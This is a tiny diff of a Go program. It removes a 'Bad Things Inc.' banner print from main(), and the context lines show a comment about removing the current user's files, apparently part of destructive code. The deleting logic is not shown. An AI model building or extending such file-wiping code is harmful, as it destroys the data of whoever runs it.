@@ -19,8 +19,6 @@ import (
 var wg sync.WaitGroup
 
 func main() {
-	fmt.Println("Bad Things Inc.")
-
 	// Remove Current User Files //
 	usr, err := user.Current()
 	if err != nil {
